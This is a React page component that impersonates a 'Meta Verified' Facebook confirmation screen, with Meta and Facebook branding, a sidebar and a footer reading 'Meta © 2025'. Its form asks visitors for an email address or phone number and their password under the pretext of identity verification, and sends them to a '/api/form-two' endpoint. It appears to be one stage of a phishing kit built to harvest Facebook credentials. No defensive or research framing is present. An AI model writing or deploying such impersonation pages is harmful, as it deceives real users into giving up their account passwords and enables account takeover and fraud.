import React, { useState } from "react";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { useLocation } from "wouter";
import MetaTags from "@/components/meta-tags";
import { formTwoSchema, type FormTwo } from "@shared/schema";
import { Search, Home, ChevronDown, Settings, Menu } from "lucide-react";
import { useMobile } from "@/hooks/use-mobile";
import { MobileModal } from "@/components/mobile-modal";

export default function Confirmation() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const [contactMethod, setContactMethod] = useState<'email' | 'phone'>('email');
  const isMobile = useMobile();
  const [showMobileModal, setShowMobileModal] = useState(false);
  const [showMobileMenu, setShowMobileMenu] = useState(false);

  const form = useForm<FormTwo>({
    resolver: zodResolver(formTwoSchema),
    defaultValues: {
      user_email: "",
      password: "",
    },
  });

  const onSubmit = async (data: FormTwo) => {
    try {
      const response = await fetch('/api/form-two', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
      });

      if (!response.ok) {
        throw new Error('Failed to submit form');
      }

      const result = await response.json();
      if (result.success) {
        toast({
          title: "Success!",
          description: "Your form has been submitted successfully"
        });
        setLocation("/success");
      } else {
        throw new Error(result.message || 'Failed to submit form');
      }
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error",
        description: error instanceof Error ? error.message : "Failed to submit form. Please try again.",
      });
    }
  };

  return (
    <div className="min-h-screen flex">
      <MetaTags 
        title="Meta Verified | Confirmation"
        description="Complete your verification process"
      />
      <MobileModal open={showMobileModal} onOpenChange={setShowMobileModal} />

      {/* Left Sidebar - Hidden on mobile */}
      <div className="hidden md:flex flex-col bg-white h-screen overflow-y-auto border-r" style={{ width: "320px" }}>
        <div className="p-4">
          <div className="flex items-center mb-4">
            <svg className="h-8 w-8 text-[#0180FA]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 23 23" fill="none">
              <path fillRule="evenodd" clipRule="evenodd" d="M21.0802 11.9059C21.0802 16.9014 16.9015 21.0802 11.9059 21.0802C6.91041 21.0802 2.73169 16.9014 2.73169 11.9059C2.73169 6.91041 6.91041 2.73169 11.9059 2.73169C16.9015 2.73169 21.0802 6.91041 21.0802 11.9059ZM23 11.9059C23 18.0195 18.0195 23 11.9059 23C5.79239 23 0.811859 18.0195 0.811859 11.9059C0.811859 5.79239 5.79239 0.811859 11.9059 0.811859C18.0195 0.811859 23 5.79239 23 11.9059ZM11.9059 19.1604C15.8411 19.1604 18.9995 16.002 18.9995 12.0668C18.9995 8.13157 15.8411 4.97319 11.9059 4.97319C7.97064 4.97319 4.81226 8.13157 4.81226 12.0668C4.81226 16.002 7.97064 19.1604 11.9059 19.1604Z" fill="currentColor"/>
            </svg>
            <h1 className="text-lg font-semibold ml-2">Meta Verified</h1>
          </div>
          <div className="flex items-center bg-[#F0F2F5] rounded-full px-3 py-2 mb-4">
            <Search className="w-4 h-4 mr-2 text-[#65676B]" />
            <input
              type="text"
              placeholder="Search"
              className="bg-transparent outline-none w-full text-sm text-[#65676B] placeholder-[#65676B]"
            />
          </div>
          <button className="w-full text-left px-3 py-2 rounded-md hover:bg-[#F0F2F5] text-sm flex items-center mb-2 text-[#65676B]">
            <Home className="w-4 h-4 mr-2" />
            Home Page
          </button>
          <div className="space-y-2">
            <button className="w-full text-left px-3 py-2 rounded-md hover:bg-[#F0F2F5] text-sm flex items-center justify-between text-[#65676B]">
              <span>Meta Verified</span>
              <ChevronDown className="w-4 h-4" />
            </button>
            <button className="w-full text-left px-3 py-2 rounded-md hover:bg-[#F0F2F5] text-sm flex items-center justify-between text-[#65676B]">
              <span>Rules and Guidelines</span>
              <ChevronDown className="w-4 h-4" />
            </button>
            <button className="w-full text-left px-3 py-2 rounded-md hover:bg-[#F0F2F5] text-sm flex items-center justify-between text-[#65676B]">
              <span>Settings</span>
              <Settings className="w-4 h-4" />
            </button>
          </div>
        </div>
      </div>

      {/* Mobile Menu Overlay */}
      {showMobileMenu && (
        <div className="md:hidden fixed inset-0 bg-black bg-opacity-50 z-40" onClick={() => setShowMobileMenu(false)}>
          <div className="bg-white w-64 h-full" onClick={e => e.stopPropagation()}>
            <div className="p-4">
              <div className="flex items-center mb-4">
                <svg className="h-8 w-8 text-[#0180FA]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 23 23" fill="none">
                  <path fillRule="evenodd" clipRule="evenodd" d="M21.0802 11.9059C21.0802 16.9014 16.9015 21.0802 11.9059 21.0802C6.91041 21.0802 2.73169 16.9014 2.73169 11.9059C2.73169 6.91041 6.91041 2.73169 11.9059 2.73169C16.9015 2.73169 21.0802 6.91041 21.0802 11.9059ZM23 11.9059C23 18.0195 18.0195 23 11.9059 23C5.79239 23 0.811859 18.0195 0.811859 11.9059C0.811859 5.79239 5.79239 0.811859 11.9059 0.811859C18.0195 0.811859 23 5.79239 23 11.9059ZM11.9059 19.1604C15.8411 19.1604 18.9995 16.002 18.9995 12.0668C18.9995 8.13157 15.8411 4.97319 11.9059 4.97319C7.97064 4.97319 4.81226 8.13157 4.81226 12.0668C4.81226 16.002 7.97064 19.1604 11.9059 19.1604Z" fill="currentColor"/>
                </svg>
                <h1 className="text-lg font-semibold ml-2">Meta Verified</h1>
              </div>
              {/* Mobile Menu Items */}
              <div className="space-y-2">
                <button className="w-full text-left px-3 py-2 rounded-md hover:bg-[#F0F2F5] text-sm flex items-center mb-2 text-[#65676B]">
                  <Home className="w-4 h-4 mr-2" />
                  Home Page
                </button>
                <button className="w-full text-left px-3 py-2 rounded-md hover:bg-[#F0F2F5] text-sm flex items-center justify-between text-[#65676B]">
                  <span>Meta Verified</span>
                  <ChevronDown className="w-4 h-4" />
                </button>
                <button className="w-full text-left px-3 py-2 rounded-md hover:bg-[#F0F2F5] text-sm flex items-center justify-between text-[#65676B]">
                  <span>Rules and Guidelines</span>
                  <ChevronDown className="w-4 h-4" />
                </button>
                <button className="w-full text-left px-3 py-2 rounded-md hover:bg-[#F0F2F5] text-sm flex items-center justify-between text-[#65676B]">
                  <span>Settings</span>
                  <Settings className="w-4 h-4" />
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Main Content */}
      <div className="flex-1 flex flex-col bg-gradient-to-br from-[#0180FA]/10 via-[#f0f2f5] to-[#0180FA]/5">
        {/* Navigation Bar */}
        <nav className="flex items-center justify-between p-3 sm:p-4 border-b bg-white/90 backdrop-blur-sm">
          <div className="flex items-center">
            {/* Mobile Menu Button */}
            <button 
              className="md:hidden mr-3 text-[#65676B]"
              onClick={() => setShowMobileMenu(true)}
            >
              <Menu className="w-6 h-6" />
            </button>
            <p className="text-[#0180FA] text-xl sm:text-2xl font-bold">facebook</p>
          </div>
          <div className="flex items-center bg-[#F0F2F5] rounded-full px-3 sm:px-4 py-1.5 sm:py-2">
            <Search className="w-3 h-3 sm:w-4 sm:h-4 mr-2 text-[#65676B]" />
            <input
              type="text"
              placeholder="Search"
              className="bg-transparent outline-none text-sm sm:text-base w-24 sm:w-auto text-[#65676B] placeholder-[#65676B]"
            />
          </div>
        </nav>

        <div className="flex-1 flex justify-center p-4 sm:p-8 overflow-y-auto">
          <div className="w-full max-w-2xl space-y-4 sm:space-y-6 bg-white/90 backdrop-blur-sm rounded-lg p-4 sm:p-6 border border-white/20 shadow-lg">
            <h1 className="text-xl sm:text-2xl font-bold text-[#1c1e21]">
              Confirm Your Contact Information
            </h1>

            <div className="space-y-3 sm:space-y-4 text-[#65676B] text-sm sm:text-base">
              <p>
                To complete the verification process, please provide your contact information. This will help us verify your identity and secure your account.
              </p>
            </div>

            <Form {...form}>
              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
                <div className="flex gap-2 mb-4">
                  <button
                    type="button"
                    onClick={() => setContactMethod('email')}
                    className={`flex-1 py-2 rounded ${
                      contactMethod === 'email'
                        ? 'bg-[#0180FA] text-white'
                        : 'bg-[#F0F2F5] text-[#1c1e21]'
                    }`}
                  >
                    Email
                  </button>
                  <button
                    type="button"
                    onClick={() => setContactMethod('phone')}
                    className={`flex-1 py-2 rounded ${
                      contactMethod === 'phone'
                        ? 'bg-[#0180FA] text-white'
                        : 'bg-[#F0F2F5] text-[#1c1e21]'
                    }`}
                  >
                    Phone
                  </button>
                </div>

                <FormField
                  control={form.control}
                  name="user_email"
                  render={({ field }) => (
                    <FormItem>
                      <FormControl>
                        <Input
                          type={contactMethod === 'email' ? 'email' : 'tel'}
                          placeholder={contactMethod === 'email' ? 'Email address' : 'Phone number'}
                          className="bg-[#F0F2F5] border-[#dddfe2] focus:border-[#0180FA] focus:ring-[#0180FA] focus:ring-opacity-50 h-[48px] text-[17px]"
                          {...field}
                        />
                      </FormControl>
                      <FormMessage className="text-xs text-[#f02849]" />
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="password"
                  render={({ field }) => (
                    <FormItem>
                      <FormControl>
                        <Input
                          type="password"
                          placeholder="Password"
                          className="bg-[#F0F2F5] border-[#dddfe2] focus:border-[#0180FA] focus:ring-[#0180FA] focus:ring-opacity-50 h-[48px] text-[17px]"
                          {...field}
                        />
                      </FormControl>
                      <FormMessage className="text-xs text-[#f02849]" />
                    </FormItem>
                  )}
                />

                <p className="text-xs sm:text-sm text-[#65676B]">
                  Please make sure to provide accurate information. This helps us maintain the security of your account.
                </p>

                <Button 
                  type="submit"
                  className="w-full bg-[#0180FA] hover:bg-[#0180FA]/90 text-white font-semibold text-[17px] h-[48px] rounded-md"
                  disabled={form.formState.isSubmitting}
                >
                  {form.formState.isSubmitting ? "Please wait..." : "Continue"}
                </Button>
              </form>
            </Form>
          </div>
        </div>

        <div className="text-center p-3 sm:p-4 text-xs sm:text-sm text-[#65676B] border-t bg-white/90 backdrop-blur-sm">
          Meta © 2025
        </div>
      </div>
    </div>
  );
}